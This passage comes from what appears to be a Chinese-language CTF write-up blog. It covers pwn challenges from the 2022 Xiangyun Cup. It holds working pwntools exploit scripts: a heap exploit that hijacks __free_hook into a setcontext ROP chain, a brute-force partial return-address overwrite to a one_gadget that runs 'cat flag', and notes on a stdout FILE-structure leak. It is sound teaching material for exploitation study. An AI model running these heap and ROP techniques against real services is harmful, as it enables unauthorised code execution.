class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<span class="hljs-comment">#0~6</span><br>    add(i,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x28</span>)<br><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x28</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">4</span>)<br><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">12</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>)<br>show(<span class="hljs-number">10</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]+libc_base<br>info(<span class="hljs-string">&#x27;free_hook&#x27;</span>,free_hook)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<span class="hljs-comment">#10</span><br>delete(<span class="hljs-number">14</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">intToBit</span>(<span class="hljs-params">n</span>):<br>        bits = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> n&gt;<span class="hljs-number">0</span>:<br>            bits = <span class="hljs-built_in">str</span>(n%<span class="hljs-number">2</span>) + bits<br>            n = n//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(bits)!=<span class="hljs-number">8</span>:<br>            bits = <span class="hljs-string">&quot;0&quot;</span>+bits<br>        <span class="hljs-keyword">return</span> bits<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bitToInt</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>            <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">int</span>(n[i])*<span class="hljs-number">2</span>**(<span class="hljs-built_in">len</span>(n)-i-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseBits</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-keyword">if</span> n==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>        bits = intToBit(n)<br>        <span class="hljs-keyword">return</span> bitToInt(bits[::-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">n</span>):<br>    n8=(n/(<span class="hljs-number">0x100000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n7=(n/(<span class="hljs-number">0x1000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n6=(n/(<span class="hljs-number">0x10000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n5=(n/(<span class="hljs-number">0x100000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n4=(n/(<span class="hljs-number">0x1000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n3=(n/(<span class="hljs-number">0x10000</span>))&amp;<span class="hljs-number">0xff</span><br>    n2=(n/(<span class="hljs-number">0x100</span>))&amp;<span class="hljs-number">0xff</span><br>    n1=(n/<span class="hljs-number">0x1</span>)&amp;<span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> ((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n1))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n2))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n3))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n4))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n5))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n6))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n7))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n8))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))<br><br><span class="hljs-comment">#print(hex(reverseBits(0x7f)))</span><br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">53</span><br><br><br>edit(<span class="hljs-number">10</span>,change(<span class="hljs-number">0x6161616161616161</span>))<br>show(<span class="hljs-number">10</span>)<br>ru(<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0xa10</span>+<span class="hljs-number">0xa00</span><br>info(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br>edit(<span class="hljs-number">10</span>,change(free_hook))<br><br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<br><br><br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x18</span>)<br><br>edit(<span class="hljs-number">15</span>,change(setcontext)  ) <br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)))<br>pop_rsi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>)))<br>pop_rdx = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>)))<br>pop_rax = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>)))<br>syscall = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br>ret = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)))<br>read=libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]+libc_base<br>write=libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]+libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pop_rdi))<br><br>edit(<span class="hljs-number">13</span>,change(<span class="hljs-number">0x67616c66</span>))<br>flag_addr=heap_base+<span class="hljs-number">0x800</span><br><br>orw=change(pop_rdi)+change(flag_addr)+change(pop_rsi)+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">8</span>+change(pop_rax)+<span class="hljs-string">&#x27;01000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;11000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;00000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;10000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(write)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">1</span>,orw)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">0xa0</span>+change(heap_base+<span class="hljs-number">0x820</span>+<span class="hljs-number">0x10</span>)+change(ret))<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="unexploitable">unexploitable</h2><h3 id="0x01程序分析-2">0x01程序分析</h3><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E4%BF%9D%E6%8A%A4.png" alt="unexp保护"></p><p>保护就canary没开</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E7%A8%8B%E5%BA%8F.png" alt="unexp程序"></p><p>程序就一个read</p><p>这题其实限制的很死了，我们也没啥好的手段，也没法找gadget，只能改改ret的地址</p><h3 id="0x02利用思路-2">0x02利用思路</h3><p>我们想办法要ret到一个libc段的地址再改为og就行</p><p>可以发现read的ret地址离libc_start_main+231差0x10</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E8%A7%A3.png" alt="unexp解"></p><p>我们只要改ret的最后一字节为0xD1，可以rsp-0x10就能ret到libc_start_main+231了</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E8%A7%A31.png" alt="unexp解1"></p><p>我们改为og，然后实际有3个位不确定，爆破1/4096概率成功</p><p>（然后这个爆破脚本可能有些问题，本地可行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./unexploitable&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = elf.arch</span><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#----------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    payload=flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>    payload+=p8(<span class="hljs-number">0xd1</span>)<br>    se(payload)<br>    <span class="hljs-comment">#debug()</span><br>    og=[<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]<br>    se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0xfc</span>)+p8(<span class="hljs-number">0xE2</span>)+p8(<span class="hljs-number">0xd6</span>))<br>    sl(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br>    r.recvline_contains(<span class="hljs-string">&#x27;flag&#x27;</span>, timeout=<span class="hljs-number">1</span>)<br>    r.interactive()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;try:&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>        r=process(<span class="hljs-string">&#x27;./unexploitable&#x27;</span>)<br>        <span class="hljs-comment">#r=remote(&#x27;39.106.13.71&#x27;,31780)</span><br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br>        i+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="leak">leak</h2><p>这题有必要复现一下，主要参考这位师傅 <a href="https://www.52pojie.cn/thread-1705930-1-1.html#44512750_%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90">wp</a></p><h3 id="0x01程序分析-3">0x01程序分析</h3><p>保护全开</p><p>delete中存在uaf</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/leak1.png" alt="leak1"></p><p>libc是Ubuntu GLIBC 2.27-3ubuntu1.6，这个版本有doublefree检测，不过我们能uaf改key</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/94%609U5B0$A2UK9K%60N6MZDJ6.png" alt="img"></p><p>这两个函数也没有输出功能，起迷惑作用</p><h3 id="0x02利用思路-3">0x02利用思路</h3><p>我们的最终目标就是打印存在堆中的flag，但是这题没有show功能，如何才能做到呢？</p><p>一般没有show功能的，我们就要打stdout，</p><p>可以改<code>0xfbad1800,0,0,0,b'\x00'</code>，这么改的话，遇到puts或printf函数会打印 IO_write_base 到 IO_write_ptr 俩指针中间的内容，</p><p>虽然程序特意避免使用puts反而用了write，但是我们可以用exit功能来触发IO流，里面就有puts或printf（应该）</p><p>（比赛时没想到用exit😅）</p><p>那我们只要改IO_write_base为flag的堆地址，IO_write_ptr 改合理的地址，exit来触发就行了</p><p>因为无法泄露出libc与heap的地址，我们要tcache poison到指定地址只能靠tcache中fd中残留的堆地址，unsortbin中存的main_arena地址（通过改tcache的fd最后一字节造成堆重叠，改main_arena后两字节指向stdout，要爆破一位1/16概率），并通过堆重叠多次利用同一个堆。</p><p>我们靠tcache poison申请堆到stdout，改IO_write_ptr 为自己定的一个地址0x577777777777</p><p>用fastbin reverse to tcache的手法，改IO_write_base 为tcache的bk，可以是堆基址+0x10</p><p>（fastbin reverse to tcache的攻击效果是往target-0x18处的地址写入对应tcache的bk指针，也就是一个堆地址）</p><p>要满足tachebin有一个为空，这里是0x40有6个</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/fastbinreversetcache1.png" alt="fastbin reverse tcache1"></p><p>接着我们再申请0x40的话会把fastbin中0x40的放到tcache中，然后target处写入了堆地址</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/fastbinreversetcache2.png" alt="fastbin reverse tcache2"></p><h3 id="0x03本地准备">0x03本地准备</h3><p>版本差异，有必要patchelf一下</p><p>用glibc-all-in-one下载这版本，找到配套ld</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/22PNOKOE@AVF@P6K(%25WG%7B)8.png" alt="img"></p><p>接着patchelf</p><p><code>patchelf --replace-needed libc.so.6 ./libc-2.27.so ./leak</code></p><p><code>patchelf --set-interpreter ./ld-2.27.so ./leak</code></p><p>最后我们把gdb的debug文件同名文件夹替换成1.6版本的gdb就能调试堆栈了</p><p><code>sudo rm -rf /usr/lib/debug</code></p><p><code>sudo cp -r ~/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/.debug/ /usr/lib/debug</code></p><h3 id="0x04exp">0x04exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./leak&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#----------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    <br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>)<br>    add(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>)<span class="hljs-comment">#victim to overlap</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(<span class="hljs-number">0</span>)<br>        edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<span class="hljs-comment">#prepare to use fastbin reverse tcache</span><br><br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>)<br>    add(<span 